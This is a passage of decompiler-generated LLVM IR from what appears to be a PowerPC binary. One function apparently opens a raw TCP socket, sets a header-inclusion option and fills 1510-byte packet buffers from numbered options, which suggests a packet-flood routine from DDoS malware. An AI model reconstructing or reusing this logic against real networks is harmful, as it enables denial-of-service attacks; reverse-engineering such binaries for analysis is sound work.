  br i1 %v2_10002d20, label %dec_label_pc_10002bbc.outer, label %dec_label_pc_10002bc0

dec_label_pc_10002d28:                            ; preds = %dec_label_pc_10002bd0
  %v1_10002d28 = add i32 %v2_10002bdc, 16
  %v2_10002d28 = inttoptr i32 %v1_10002d28 to i32*
  %v3_10002d28 = load i32, i32* %v2_10002d28, align 4
  store i32 %v3_10002d28, i32* %r29.global-to-local, align 4
  %v0_10002d2c = call i32 @function_10007ca8()
  store i32 %v0_10002d2c, i32* %r3.global-to-local, align 4
  %v3_10002d30 = load i32, i32* %stack_var_-104, align 4
  store i32 %v3_10002d30, i32* %r9.global-to-local, align 4
  %v0_10002d34 = load i32, i32* %r20.global-to-local, align 4
  %v1_10002d34 = mul i32 %v0_10002d34, 16
  %v2_10002d34 = udiv i32 %v0_10002d34, 268435456
  %v3_10002d34 = or i32 %v2_10002d34, %v1_10002d34
  store i32 %v3_10002d34, i32* %r20.global-to-local, align 4
  %v1_10002d38 = call %0 @__asm_mtcrf(i32 1, i32 %v3_10002d34)
  %v1_10002d3c = mul nuw i32 %v2_10002d34, 268435456
  %v2_10002d3c = urem i32 %v0_10002d34, 268435456
  %v3_10002d3c = or i32 %v1_10002d3c, %v2_10002d3c
  store i32 %v3_10002d3c, i32* %r20.global-to-local, align 4
  %v0_10002d40 = load i32, i32* %r9.global-to-local, align 4
  %v1_10002d40 = mul i32 %v0_10002d40, 24
  %v1_10002d44 = load i32, i32* %r25.global-to-local, align 4
  %v2_10002d44 = add i32 %v1_10002d44, %v1_10002d40
  store i32 %v2_10002d44, i32* %r9.global-to-local, align 4
  %v1_10002d48 = add i32 %v2_10002d44, 20
  %v2_10002d48 = inttoptr i32 %v1_10002d48 to i8*
  %v3_10002d48 = load i8, i8* %v2_10002d48, align 1
  %v4_10002d48 = zext i8 %v3_10002d48 to i32
  store i32 %v4_10002d48, i32* %r0.global-to-local, align 4
  %tmp = urem i8 %v3_10002d48, 64
  %v2_10002d4c = zext i8 %tmp to i32
  %v3_10002d4c = lshr i32 %v0_10002d2c, %v2_10002d4c
  store i32 %v3_10002d4c, i32* %r3.global-to-local, align 4
  %v0_10002d50 = load i32, i32* %r29.global-to-local, align 4
  %v2_10002d50 = add i32 %v3_10002d4c, %v0_10002d50
  store i32 %v2_10002d50, i32* %r29.global-to-local, align 4
  %v1_10002d54 = load i32, i32* %r28.global-to-local, align 4
  %v2_10002d54 = add i32 %v1_10002d54, 16
  %v3_10002d54 = inttoptr i32 %v2_10002d54 to i32*
  store i32 %v2_10002d50, i32* %v3_10002d54, align 4
  %v0_10002d58 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10002d58, label %dec_label_pc_10002d5c, label %dec_label_pc_10002c08

dec_label_pc_10002d5c:                            ; preds = %dec_label_pc_10002d28, %dec_label_pc_10002bf8
  store i32 0, i32* %r29.global-to-local, align 4
  %v0_10002d60 = call i32 @function_10007ca8()
  store i32 %v0_10002d60, i32* %r3.global-to-local, align 4
  store i32 65535, i32* @r29, align 4
  %v1_10002d68 = load i32, i32* %r28.global-to-local, align 4
  %v2_10002d68 = add i32 %v1_10002d68, 12
  %v3_10002d68 = inttoptr i32 %v2_10002d68 to i32*
  store i32 %v0_10002d60, i32* %v3_10002d68, align 4
  %v0_10002d6c = load i32, i32* %r24.global-to-local, align 4
  %v1_10002d6c = load i32, i32* @r29, align 4
  %v4_10002d6c = icmp eq i32 %v0_10002d6c, %v1_10002d6c
  store i1 %v4_10002d6c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10002d6c, label %dec_label_pc_10002d74, label %dec_label_pc_10002c18

dec_label_pc_10002d74:                            ; preds = %dec_label_pc_10002d5c, %dec_label_pc_10002c08
  %v0_10002d74 = call i32 @function_10007ca8()
  %v0_10002d78 = load i32, i32* %r16.global-to-local, align 4
  %v1_10002d78 = load i32, i32* @r29, align 4
  %v4_10002d78 = icmp eq i32 %v0_10002d78, %v1_10002d78
  store i1 %v4_10002d78, i1* %cr7_eq.global-to-local, align 1
  %v1_10002d7c = urem i32 %v0_10002d74, 65536
  store i32 %v1_10002d7c, i32* %r3.global-to-local, align 4
  %v1_10002d80 = add nsw i32 %v1_10002d7c, -1000
  store i32 %v1_10002d80, i32* %r0.global-to-local, align 4
  %v1_10002d84 = trunc i32 %v0_10002d74 to i16
  %v2_10002d84 = load i32, i32* %r28.global-to-local, align 4
  %v3_10002d84 = add i32 %v2_10002d84, 4
  %v4_10002d84 = inttoptr i32 %v3_10002d84 to i16*
  store i16 %v1_10002d84, i16* %v4_10002d84, align 2
  %v0_10002d88 = load i32, i32* %r0.global-to-local, align 4
  %v1_10002d88 = sub i32 -1, %v0_10002d88
  store i32 %v1_10002d88, i32* %r0.global-to-local, align 4
  %v1_10002d8c = trunc i32 %v1_10002d88 to i16
  %v2_10002d8c = load i32, i32* @r31, align 4
  %v3_10002d8c = add i32 %v2_10002d8c, 4
  %v4_10002d8c = inttoptr i32 %v3_10002d8c to i16*
  store i16 %v1_10002d8c, i16* %v4_10002d8c, align 2
  br i1 %v4_10002d78, label %dec_label_pc_10002d94, label %dec_label_pc_10002d74.dec_label_pc_10002c20_crit_edge

dec_label_pc_10002d74.dec_label_pc_10002c20_crit_edge: ; preds = %dec_label_pc_10002d74
  %v1_10002c20.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10002c20

dec_label_pc_10002d94:                            ; preds = %dec_label_pc_10002d74, %dec_label_pc_10002c18
  %v0_10002d94 = call i32 @function_10007ca8()
  %v1_10002d94 = trunc i32 %v0_10002d94 to i16
  store i32 %v0_10002d94, i32* %r3.global-to-local, align 4
  %v0_10002d98 = load i32, i32* %r17.global-to-local, align 4
  %v1_10002d98 = load i32, i32* @r29, align 4
  %v4_10002d98 = icmp eq i32 %v0_10002d98, %v1_10002d98
  store i1 %v4_10002d98, i1* %cr7_eq.global-to-local, align 1
  %v3_10002d9c = load i32, i32* %r28.global-to-local, align 4
  %v4_10002d9c = add i32 %v3_10002d9c, 58
  %v5_10002d9c = inttoptr i32 %v4_10002d9c to i16*
  store i16 %v1_10002d94, i16* %v5_10002d9c, align 2
  br i1 %v4_10002d98, label %dec_label_pc_10002da4, label %dec_label_pc_10002c28

dec_label_pc_10002da4:                            ; preds = %dec_label_pc_10002d94, %dec_label_pc_10002c20
  %v0_10002da4 = call i32 @function_10007ca8()
  %v1_10002da4 = trunc i32 %v0_10002da4 to i16
  store i32 %v0_10002da4, i32* %r3.global-to-local, align 4
  %v3_10002da8 = load i32, i32* %r27.global-to-local, align 4
  %v4_10002da8 = add i32 %v3_10002da8, 2
  %v5_10002da8 = inttoptr i32 %v4_10002da8 to i16*
  store i16 %v1_10002da4, i16* %v5_10002da8, align 2
  %v0_10002dac = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10002dac, label %dec_label_pc_10002db0, label %dec_label_pc_10002c2c

dec_label_pc_10002db0:                            ; preds = %dec_label_pc_10002da4, %dec_label_pc_10002c28
  %v0_10002db0 = call i32 @function_10007ca8()
  store i32 %v0_10002db0, i32* %r3.global-to-local, align 4
  %v1_10002db4 = load i32, i32* @r31, align 4
  %v2_10002db4 = add i32 %v1_10002db4, 16
  %v3_10002db4 = inttoptr i32 %v2_10002db4 to i32*
  store i32 %v0_10002db0, i32* %v3_10002db4, align 4
  br label %dec_label_pc_10002c34

dec_label_pc_10002dbc:                            ; preds = %dec_label_pc_10002c34
  %v0_10002dbc = load i32, i32* %r27.global-to-local, align 4
  %v1_10002dbc = add i32 %v0_10002dbc, 8
  store i32 %v1_10002dbc, i32* @r3, align 4
  %v0_10002dc0 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_10002dc0, i32* @r4, align 4
  %v0_10002dc4 = call i32 @function_10007ed4()
  store i32 %v0_10002dc4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10002c90

; uselistorder directives
  uselistorder i32 %v0_10002da4, { 1, 0 }
  uselistorder i32 %v0_10002d94, { 1, 0 }
  uselistorder i32 %v1_10002d88, { 1, 0 }
  uselistorder i32 %v1_10002d7c, { 1, 0 }
  uselistorder i32 %v0_10002d74, { 1, 0 }
  uselistorder i32 %v1_10002d6c, { 1, 0 }
  uselistorder i32 %v0_10002d34, { 2, 1, 0 }
  uselistorder i1 %v1_10002d20, { 1, 0 }
  uselistorder i1 %v0_10002d20, { 1, 0 }
  uselistorder i32 %v1_10002d10, { 0, 3, 2, 4, 1 }
  uselistorder i32 %v2_10002cec, { 0, 2, 1, 3 }
  uselistorder i32 %v4_10002ccc, { 1, 0 }
  uselistorder i32 %v0_10002bf8, { 2, 1, 0 }
  uselistorder i32 %v4_10002bd8, { 2, 1, 0, 3 }
  uselistorder i32 %v1_10002bd4, { 1, 0 }
  uselistorder i32 %v1_10002b20, { 1, 0 }
  uselistorder i32 %v1_10002a5c, { 1, 0 }
  uselistorder i32 %v1_10002a50, { 1, 0 }
  uselistorder i32 %v1_100029ec, { 1, 0 }
  uselistorder i32 %v0_100029ec, { 1, 2, 3, 0 }
  uselistorder i32 %v1_100029dc, { 1, 2, 0 }
  uselistorder i32 %v0_100029d0, { 1, 0 }
  uselistorder i32 %v5_1000297c, { 0, 3, 1, 2 }
  uselistorder i32* %r9.global-to-local, { 15, 16, 17, 18, 19, 20, 21, 22, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0, 1, 13, 14 }
  uselistorder i32* %r31.global-to-local, { 16, 8, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 0, 1, 2, 3, 15 }
  uselistorder i32* %r30.global-to-local, { 12, 0, 2, 3, 4, 5, 6, 7, 8, 9, 1, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 3, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 0, 11, 4, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 2, 1 }
  uselistorder i32* %r29.global-to-local, { 5, 4, 6, 7, 8, 3, 0, 1, 2 }
  uselistorder i32* %r27.global-to-local, { 9, 4, 5, 6, 7, 8, 10, 0, 1, 2, 3 }
  uselistorder i32* %r26.global-to-local, { 4, 5, 6, 7, 8, 0, 1, 2, 3 }
  uselistorder i32* %r25.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r24.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r23.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r22.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r21.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r20.global-to-local, { 3, 4, 7, 5, 6, 8, 9, 0, 1, 2 }
  uselistorder i32* %r19.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r18.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r17.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r16.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r15.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r14.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32* %r11.global-to-local, { 9, 10, 11, 0, 1, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %r0.global-to-local, { 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0, 2, 3, 4, 5, 6, 7, 8, 9, 14, 10, 11, 12, 13, 1, 15, 16, 17, 18, 19 }
  uselistorder i1* %cr7_eq.global-to-local, { 3, 4, 5, 10, 6, 7, 8, 9, 11, 12, 13, 0, 1, 2 }
  uselistorder i1* %cr4_eq.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cr3_eq.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i1* %cr2_eq.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder i32 38, { 3, 4, 5, 6, 0, 7, 1, 8, 2, 9 }
  uselistorder i32 66, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10002c90, { 1, 0 }
  uselistorder label %dec_label_pc_10002bc0, { 1, 0 }
  uselistorder label %dec_label_pc_10002bbc, { 1, 0 }
  uselistorder label %dec_label_pc_10002b9c, { 1, 0 }
  uselistorder label %dec_label_pc_10002b38, { 1, 0 }
  uselistorder label %dec_label_pc_10002b0c, { 1, 0 }
  uselistorder label %dec_label_pc_10002aa4, { 1, 0 }
}

define i32 @function_10002dcc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10002dcc:
  %cr2_eq.global-to-local = alloca i1, align 1
  %cr3_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr4_lt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-104 = alloca i32, align 4
  %v0_10002dd0 = load i32, i32* @lr, align 4
  store i32 %v0_10002dd0, i32* %r0.global-to-local, align 4
  %v0_10002dd4 = call i32 @__asm_mfcr()
  store i32 %v0_10002dd4, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r26.global-to-local, align 4
  %v0_10002de4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10002dd4, i32* %r19.global-to-local, align 4
  %v0_10002e18 = load i32, i32* @r28, align 4
  store i32 %arg4, i32* @r28, align 4
  %v0_10002e20 = load i32, i32* @r29, align 4
  store i32 %arg3, i32* @r29, align 4
  %v0_10002e28 = load i32, i32* @r30, align 4
  %v0_10002e2c = load i32, i32* @r31, align 4
  store i32 268447296, i32* @lr, align 4
  %v2_10002e3c = call i32 @function_1000c548(i32 4, i32 4)
  store i32 %v2_10002e3c, i32* %r20.global-to-local, align 4
  %v0_10002e44 = load i32, i32* @r28, align 4
  %v0_10002e50 = load i32, i32* @r29, align 4
  store i32 %v0_10002e50, i32* %r3.global-to-local, align 4
  store i32 268447320, i32* @lr, align 4
  %v4_10002e54 = inttoptr i32 %v0_10002e44 to i32*
  %v5_10002e54 = call i32 @function_1000235c(i32 %v0_10002e50, i32* %v4_10002e54, i32 2, i32 0)
  %v0_10002e64 = load i32, i32* @r28, align 4
  %v1_10002e68 = urem i32 %v5_10002e54, 256
  store i32 %v1_10002e68, i32* %r14.global-to-local, align 4
  %v0_10002e6c = load i32, i32* @r29, align 4
  store i32 %v0_10002e6c, i32* %r3.global-to-local, align 4
  store i32 268447348, i32* @lr, align 4
  %v4_10002e70 = inttoptr i32 %v0_10002e64 to i32*
  %v5_10002e70 = call i32 @function_1000235c(i32 %v0_10002e6c, i32* %v4_10002e70, i32 3, i32 65535)
  %v0_10002e74 = load i32, i32* @r28, align 4
  store i32 %v5_10002e70, i32* %r25.global-to-local, align 4
  %v0_10002e84 = load i32, i32* @r29, align 4
  store i32 %v0_10002e84, i32* %r3.global-to-local, align 4
  store i32 268447372, i32* @lr, align 4
  %v4_10002e88 = inttoptr i32 %v0_10002e74 to i32*
  %v5_10002e88 = call i32 @function_1000235c(i32 %v0_10002e84, i32* %v4_10002e88, i32 4, i32 64)
  %v0_10002e8c = load i32, i32* @r28, align 4
  %v1_10002e98 = urem i32 %v5_10002e88, 256
  store i32 %v1_10002e98, i32* %r21.global-to-local, align 4
  %v0_10002e9c = load i32, i32* @r29, align 4
  store i32 %v0_10002e9c, i32* %r3.global-to-local, align 4
  store i32 268447396, i32* @lr, align 4
  %v4_10002ea0 = inttoptr i32 %v0_10002e8c to i32*
  %v5_10002ea0 = call i32 @function_1000235c(i32 %v0_10002e9c, i32* %v4_10002ea0, i32 5, i32 1)
  %v0_10002eb0 = load i32, i32* @r28, align 4
  %v1_10002eb4 = urem i32 %v5_10002ea0, 256
  store i32 %v1_10002eb4, i32* @r31, align 4
  %v0_10002eb8 = load i32, i32* @r29, align 4
  store i32 %v0_10002eb8, i32* %r3.global-to-local, align 4
  store i32 268447424, i32* @lr, align 4
  %v4_10002ebc = inttoptr i32 %v0_10002eb0 to i32*
  %v5_10002ebc = call i32 @function_1000235c(i32 %v0_10002eb8, i32* %v4_10002ebc, i32 6, i32 65535)
  %v0_10002ec4 = load i32, i32* @r28, align 4
  store i32 %v5_10002ebc, i32* %r24.global-to-local, align 4
  %v0_10002ed4 = load i32, i32* @r29, align 4
  store i32 %v0_10002ed4, i32* %r3.global-to-local, align 4
  store i32 268447452, i32* @lr, align 4
  %v4_10002ed8 = inttoptr i32 %v0_10002ec4 to i32*
  %v5_10002ed8 = call i32 @function_1000235c(i32 %v0_10002ed4, i32* %v4_10002ed8, i32 7, i32 65535)
  %v0_10002edc = load i32, i32* @r28, align 4
  store i32 %v5_10002ed8, i32* %r27.global-to-local, align 4
  %v0_10002eec = load i32, i32* @r29, align 4
  store i32 %v0_10002eec, i32* %r3.global-to-local, align 4
  store i32 268447476, i32* @lr, align 4
  %v4_10002ef0 = inttoptr i32 %v0_10002edc to i32*
  %v5_10002ef0 = call i32 @function_1000235c(i32 %v0_10002eec, i32* %v4_10002ef0, i32 0, i32 512)
  %v0_10002ef4 = load i32, i32* @r28, align 4
  store i32 %v5_10002ef0, i32* %r16.global-to-local, align 4
  %v0_10002f04 = load i32, i32* @r29, align 4
  store i32 %v0_10002f04, i32* %r3.global-to-local, align 4
  store i32 268447500, i32* @lr, align 4
  %v4_10002f08 = inttoptr i32 %v0_10002ef4 to i32*
  %v5_10002f08 = call i32 @function_1000235c(i32 %v0_10002f04, i32* %v4_10002f08, i32 1, i32 1)
  %v0_10002f0c = load i32, i32* @r28, align 4
  %v1_10002f18 = urem i32 %v5_10002f08, 256
  store i32 %v1_10002f18, i32* %r15.global-to-local, align 4
  %v0_10002f1c = load i32, i32* @r29, align 4
  store i32 %v0_10002f1c, i32* %r3.global-to-local, align 4
  store i32 268447524, i32* @lr, align 4
  %v4_10002f20 = inttoptr i32 %v0_10002f0c to i32*
  %v5_10002f20 = call i32 @function_1000235c(i32 %v0_10002f1c, i32* %v4_10002f20, i32 19, i32 0)
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_10002f28 = load i32, i32* @global_var_1001eb10.71, align 4
  %v0_10002f2c = load i32, i32* @r28, align 4
  store i32 %v5_10002f20, i32* %r30.global-to-local, align 4
  %v0_10002f38 = load i32, i32* @r29, align 4
  store i32 %v0_10002f38, i32* %r3.global-to-local, align 4
  store i32 268447552, i32* @lr, align 4
  %v4_10002f3c = inttoptr i32 %v0_10002f2c to i32*
  %v5_10002f3c = call i32 @function_1000235c(i32 %v0_10002f38, i32* %v4_10002f3c, i32 25, i32 %v3_10002f28)
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268447572, i32* @lr, align 4
  %v3_10002f50 = call i32 @function_1000c1bc(i32 2, i32 3, i32 6)
  store i32 %v3_10002f50, i32* %r3.global-to-local, align 4
  %v3_10002f54 = icmp eq i32 %v3_10002f50, -1
  store i1 %v3_10002f54, i1* %cr7_eq.global-to-local, align 1
  store i32 %v3_10002f50, i32* %r23.global-to-local, align 4
  br i1 %v3_10002f54, label %dec_label_pc_100030ec, label %dec_label_pc_10002f60

dec_label_pc_10002f60:                            ; preds = %dec_label_pc_10002dcc
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_10002f6c = ptrtoint i32* %stack_var_-104 to i32
  store i32 1, i32* %stack_var_-104, align 4
  store i32 268447612, i32* @lr, align 4
  %v5_10002f78 = call i32 @function_1000c180(i32 0, i32 3, i32 %v2_10002f6c, i32 4, i32 4)
  store i32 %v5_10002f78, i32* %r3.global-to-local, align 4
  %v3_10002f7c = icmp eq i32 %v5_10002f78, -1
  store i1 %v3_10002f7c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10002f7c, label %dec_label_pc_100030e4, label %dec_label_pc_10002f84

dec_label_pc_10002f84:                            ; preds = %dec_label_pc_10002f60
  %v0_10002f84 = load i32, i32* %r19.global-to-local, align 4
  %v1_10002f84 = icmp slt i32 %v0_10002f84, 0
  %v3_10002f84 = icmp eq i32 %v0_10002f84, 0
  store i1 %v1_10002f84, i1* %cr4_lt.global-to-local, align 1
  store i1 %v3_10002f84, i1* %cr4_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-104, align 4
  %v0_10002f90 = load i32, i32* %r25.global-to-local, align 4
  %v1_10002f90 = urem i32 %v0_10002f90, 65536
  store i32 %v1_10002f90, i32* %r25.global-to-local, align 4
  %v0_10002f94 = load i32, i32* %r24.global-to-local, align 4
  %v1_10002f94 = urem i32 %v0_10002f94, 65536
  store i32 %v1_10002f94, i32* %r17.global-to-local, align 4
  %v0_10002f98 = load i32, i32* %r27.global-to-local, align 4
  %v1_10002f98 = urem i32 %v0_10002f98, 65536
  store i32 %v1_10002f98, i32* %r18.global-to-local, align 4
  %v0_10002f9c = load i32, i32* %r30.global-to-local, align 4
  %v1_10002f9c = urem i32 %v0_10002f9c, 256
  store i32 %v1_10002f9c, i32* %r3.global-to-local, align 4
  %tmp33 = icmp slt i32 %v0_10002f84, 1
  br i1 %tmp33, label %dec_label_pc_1000314c, label %dec_label_pc_10002fa4

dec_label_pc_10002fa4:                            ; preds = %dec_label_pc_10002f84
  %v0_10002fa4 = load i32, i32* @r31, align 4
  %v3_10002fa4 = icmp eq i32 %v0_10002fa4, 0
  store i1 %v3_10002fa4, i1* %cr2_eq.global-to-local, align 1
  %v3_10002fa8 = icmp eq i32 %v1_10002f9c, 0
  store i1 %v3_10002fa8, i1* %cr3_eq.global-to-local, align 1
  %v0_10002fac = load i32, i32* %r16.global-to-local, align 4
  %v1_10002fac = urem i32 %v0_10002fac, 65536
  %v0_10002f90.not = or i32 %v0_10002f90, -65536
  %v1_10002fb0 = xor i32 %v0_10002f90.not, 65535
  store i32 %v1_10002fb0, i32* %r11.global-to-local, align 4
  %v1_10002fb8 = add nuw nsw i32 %v1_10002fac, 52
  store i32 %v1_10002fb8, i32* %r0.global-to-local, align 4
  %v1_10002fbc = add nuw nsw i32 %v1_10002fac, 28
  store i32 %v1_10002fbc, i32* %r9.global-to-local, align 4
  %fold = add i32 %v0_10002fac, 52
  %v1_10002fc0 = urem i32 %fold, 65536
  store i32 %v1_10002fc0, i32* %r22.global-to-local, align 4
  %fold8 = add i32 %v0_10002fac, 28
  %v1_10002fc4 = urem i32 %fold8, 65536
  store i32 %v1_10002fc4, i32* %r24.global-to-local, align 4
  %v1_10002fc8 = urem i32 %v1_10002fb0, 65536
  store i32 %v1_10002fc8, i32* %r27.global-to-local, align 4
  %fold9 = add i32 %v0_10002fac, 8
  %v1_10002fcc = urem i32 %fold9, 65536
  store i32 %v1_10002fcc, i32* @r28, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10003000

dec_label_pc_10002fd8:                            ; preds = %dec_label_pc_100030c0
  %v0_10002fd8 = load i32, i32* %r31.global-to-local, align 4
  %v1_10002fd8 = add i32 %v0_10002fd8, 16
  %v2_10002fd8 = inttoptr i32 %v1_10002fd8 to i32*
  %v3_10002fd8 = load i32, i32* %v2_10002fd8, align 4
  store i32 %v3_10002fd8, i32* %r0.global-to-local, align 4
  %v1_10002fdc = load i32, i32* %r30.global-to-local, align 4
  %v2_10002fdc = add i32 %v1_10002fdc, 16
  %v3_10002fdc = inttoptr i32 %v2_10002fdc to i32*
  store i32 %v3_10002fd8, i32* %v3_10002fdc, align 4
  br label %dec_label_pc_10002fe0

dec_label_pc_10002fe0:                            ; preds = %dec_label_pc_100030dc, %dec_label_pc_10002fd8
  %v3_10002fe0 = load i32, i32* %stack_var_-104, align 4
  store i32 %v3_10002fe0, i32* %r9.global-to-local, align 4
  %v0_10002fe4 = load i32, i32* @r28, align 4
  %v1_10002fe4 = trunc i32 %v0_10002fe4 to i16
  %v2_10002fe4 = load i32, i32* %r29.global-to-local, align 4
  %v3_10002fe4 = add i32 %v2_10002fe4, 4
  %v4_10002fe4 = inttoptr i32 %v3_10002fe4 to i16*
  store i16 %v1_10002fe4, i16* %v4_10002fe4, align 2
  %v0_10002fe8 = load i32, i32* %r9.global-to-local, align 4
  %v1_10002fe8 = add i32 %v0_10002fe8, 1
  store i32 %v1_10002fe8, i32* %r31.global-to-local, align 4
  %v0_10002fec = load i32, i32* %r17.global-to-local, align 4
  %v1_10002fec = trunc i32 %v0_10002fec to i16
  %v2_10002fec = load i32, i32* %r29.global-to-local, align 4
  %v3_10002fec = inttoptr i32 %v2_10002fec to i16*
  store i16 %v1_10002fec, i16* %v3_10002fec, align 2
  %v0_10002ff0 = load i32, i32* %r31.global-to-local, align 4
  %v1_10002ff0 = load i32, i32* %r19.global-to-local, align 4
  %v2_10002ff0 = icmp slt i32 %v0_10002ff0, %v1_10002ff0
  %v4_10002ff0 = icmp eq i32 %v0_10002ff0, %v1_10002ff0
  store i1 %v4_10002ff0, i1* %cr7_eq.global-to-local, align 1
  %v0_10002ff4 = load i32, i32* %r18.global-to-local, align 4
  %v1_10002ff4 = trunc i32 %v0_10002ff4 to i16
  %v2_10002ff4 = load i32, i32* %r29.global-to-local, align 4
  %v3_10002ff4 = add i32 %v2_10002ff4, 2
  %v4_10002ff4 = inttoptr i32 %v3_10002ff4 to i16*
  store i16 %v1_10002ff4, i16* %v4_10002ff4, align 2
  %v0_10002ff8 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10002ff8, i32* %stack_var_-104, align 4
  br i1 %v2_10002ff0, label %dec_label_pc_10003000, label %dec_label_pc_10003150

dec_label_pc_10003000:                            ; preds = %dec_label_pc_10002fe0, %dec_label_pc_10002fa4
  store i32 1510, i32* %r3.global-to-local, align 4
  store i32 268447756, i32* @lr, align 4
  %v2_10003008 = call i32 @function_1000c548(i32 1510, i32 4)
  store i32 %v2_10003008, i32* %r3.global-to-local, align 4
  %v3_1000300c = load i32, i32* %stack_var_-104, align 4
  store i32 %v3_1000300c, i32* %r9.global-to-local, align 4
  %v0_10003010 = load i32, i32* @r31, align 4
  %v1_10003010 = mul i32 %v0_10003010, 4
  store i32 %v1_10003010, i32* %r0.global-to-local, align 4
  store i32 5, i32* %r11.global-to-local, align 4
  %v1_10003018 = load i32, i32* %r20.global-to-local, align 4
  %v3_10003018 = add i32 %v1_10003018, %v1_10003010
  %v4_10003018 = inttoptr i32 %v3_10003018 to i32*
  store i32 %v2_10003008, i32* %v4_10003018, align 4
  %v0_1000301c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000301c = mul i32 %v0_1000301c, 4
  store i32 %v1_1000301c, i32* %r9.global-to-local, align 4
  %v1_10003020 = load i32, i32* %r20.global-to-local, align 4
  %v2_10003020 = add i32 %v1_10003020, %v1_1000301c
  %v3_10003020 = inttoptr i32 %v2_10003020 to i32*
  %v4_10003020 = load i32, i32* %v3_10003020, align 4
  store i32 %v4_10003020, i32* %r31.global-to-local, align 4
  store i32 4, i32* %r9.global-to-local, align 4
  %v1_10003028 = inttoptr i32 %v4_10003020 to i32*
  %v2_10003028 = load i32, i32* %v1_10003028, align 4
  store i32 %v2_10003028, i32* %r0.global-to-local, align 4
  %v1_1000302c = add i32 %v4_10003020, 24
  store i32 %v1_1000302c, i32* %r30.global-to-local, align 4
  %v0_10003030 = load i32, i32* %r21.global-to-local, align 4
  %v1_10003030 = trunc i32 %v0_10003030 to i8
  %v3_10003030 = add i32 %v4_10003020, 8
  %v4_10003030 = inttoptr i32 %v3_10003030 to i8*
  store i8 %v1_10003030, i8* %v4_10003030, align 1
  %v0_10003034 = load i32, i32* %r31.global-to-local, align 4
  %v1_10003034 = add i32 %v0_10003034, 44
  store i32 %v1_10003034, i32* %r29.global-to-local, align 4
  %v1_10003038 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10003038, i32* %r0.global-to-local, align 4
  %v0_1000303c = load i32, i32* %r25.global-to-local, align 4
  %v1_1000303c = trunc i32 %v0_1000303c to i16
  %v2_1000303c = load i32, i32* %r31.global-to-local, align 4
  %v3_1000303c = add i32 %v2_1000303c, 4
  %v4_1000303c = inttoptr i32 %v3_1000303c to i16*
  store i16 %v1_1000303c, i16* %v4_1000303c, align 2
  %v1_10003040 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_10003040, i32* %r0.global-to-local, align 4
  %v0_10003044 = load i32, i32* %r31.global-to-local, align 4
  %v1_10003044 = add i32 %v0_10003044, 20
  store i32 %v1_10003044, i32* %r9.global-to-local, align 4
  %v2_10003048 = inttoptr i32 %v0_10003044 to i32*
  store i32 %v1_10003040, i32* %v2_10003048, align 4
  %v0_1000304c = load i32, i32* %r14.global-to-local, align 4
  %v1_1000304c = trunc i32 %v0_1000304c to i8
  %v2_1000304c = load i32, i32* %r31.global-to-local, align 4
  %v3_1000304c = add i32 %v2_1000304c, 1
  %v4_1000304c = inttoptr i32 %v3_1000304c to i8*
